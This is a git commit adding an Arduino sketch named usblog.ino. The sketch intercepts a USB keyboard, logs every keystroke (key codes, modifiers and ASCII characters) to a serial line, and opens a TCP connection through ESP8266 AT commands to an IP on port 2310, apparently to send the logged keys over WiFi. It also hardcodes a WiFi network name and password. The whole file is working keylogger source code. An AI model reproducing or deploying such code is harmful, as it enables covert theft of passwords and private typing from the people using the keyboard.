0a6e05bcc3d1d2fd31b72f01afbd07c9fd7be70b
onerro <onerro@users.noreply.github.com>
2016-10-07 00:39:51 +0800

    Add files via upload

---
+++ usblog.ino
@@ -0,0 +1,145 @@
+#include <hidboot.h>
+#include <usbhub.h>
+#include <Keyboard.h>
+
+// Satisfy the IDE, which needs to see the include statment in the ino too.
+#ifdef dobogusinclude
+#include <spi4teensy3.h>
+#include <SPI.h>
+#endif
+
+String IP = "";
+String PORT = "2310";
+String SSID = "Algorithm is Art";
+String PWD = "maybe000";
+//String STR = "";
+
+
+
+class KbdRptParser : public KeyboardReportParser
+{
+    void PrintKey(uint8_t mod, uint8_t key);
+
+  protected:
+    void OnControlKeysChanged(uint8_t before, uint8_t after);
+
+    void OnKeyDown  (uint8_t mod, uint8_t key);
+    void OnKeyUp  (uint8_t mod, uint8_t key);
+    void OnKeyPressed(uint8_t key);
+};
+
+void KbdRptParser::PrintKey(uint8_t m, uint8_t key)
+{
+  MODIFIERKEYS mod;
+  *((uint8_t*)&mod) = m;
+  Serial1.print((mod.bmLeftCtrl   == 1) ? "C" : " ");
+  Serial1.print((mod.bmLeftShift  == 1) ? "S" : " ");
+  Serial1.print((mod.bmLeftAlt    == 1) ? "A" : " ");
+  Serial1.print((mod.bmLeftGUI    == 1) ? "G" : " ");
+
+  Serial1.print(" >");
+  PrintHex<uint8_t>(key, 0x80);
+  Serial1.print("< ");
+
+  Serial1.print((mod.bmRightCtrl   == 1) ? "C" : " ");
+  Serial1.print((mod.bmRightShift  == 1) ? "S" : " ");
+  Serial1.print((mod.bmRightAlt    == 1) ? "A" : " ");
+  Serial1.println((mod.bmRightGUI    == 1) ? "G" : " ");
+};
+
+void KbdRptParser::OnKeyDown(uint8_t mod, uint8_t key)
+{
+  Serial1.print("DN ");
+  PrintKey(mod, key);
+  uint8_t c = OemToAscii(mod, key);
+
+  if (c)
+    OnKeyPressed(c);
+}
+
+void KbdRptParser::OnControlKeysChanged(uint8_t before, uint8_t after) {
+
+  MODIFIERKEYS beforeMod;
+  *((uint8_t*)&beforeMod) = before;
+
+  MODIFIERKEYS afterMod;
+  *((uint8_t*)&afterMod) = after;
+
+  if (beforeMod.bmLeftCtrl != afterMod.bmLeftCtrl) {
+    Serial1.println("LeftCtrl changed");
+  }
+  if (beforeMod.bmLeftShift != afterMod.bmLeftShift) {
+    Serial1.println("LeftShift changed");
+  }
+  if (beforeMod.bmLeftAlt != afterMod.bmLeftAlt) {
+    Serial1.println("LeftAlt changed");
+  }
+  if (beforeMod.bmLeftGUI != afterMod.bmLeftGUI) {
+    Serial1.println("LeftGUI changed");
+  }
+
+  if (beforeMod.bmRightCtrl != afterMod.bmRightCtrl) {
+    Serial1.println("RightCtrl changed");
+  }
+  if (beforeMod.bmRightShift != afterMod.bmRightShift) {
+    Serial1.println("RightShift changed");
+  }
+  if (beforeMod.bmRightAlt != afterMod.bmRightAlt) {
+    Serial1.println("RightAlt changed");
+  }
+  if (beforeMod.bmRightGUI != afterMod.bmRightGUI) {
+    Serial1.println("RightGUI changed");
+  }
+
+}
+
+void KbdRptParser::OnKeyUp(uint8_t mod, uint8_t key)
+{
+  Serial1.print("UP ");
+  PrintKey(mod, key);
+}
+
+void KbdRptParser::OnKeyPressed(uint8_t key)
+{
+  Serial1.print("ASCII: ");
+  Serial1.println((char)key);
+};
+
+USB     Usb;
+//USBHub     Hub(&Usb);
+HIDBoot<USB_HID_PROTOCOL_KEYBOARD>    HidKeyboard(&Usb);
+
+uint32_t next_time;
+
+KbdRptParser Prs;
+
+void setup()
+{
+  Serial1.begin( 115200 );
+#if !defined(__MIPSEL__)
+  while (!Serial1); // Wait for serial port to connect - used on Leonardo, Teensy and other boards with built-in USB CDC serial connection
+#endif
+  Serial1.println("AT+CIPSTART=\"TCP\",\"" + IP + "\"," + PORT);
+  delay(100);
+  Serial1.println("AT+CIPSEND=4");
+  delay(100);
+  Serial1.println("test");
+  delay(100);
+  Serial1.println("Start");
+
+  if (Usb.Init() == -1)
+    Serial1.println("OSC did not start.");
+
+  delay( 200 );
+
+  next_time = millis() + 5000;
+
+  HidKeyboard.SetReportParser(0, &Prs);
+  Keyboard.begin();
+}
+
+void loop()
+{
+  Usb.Task();
+}
+
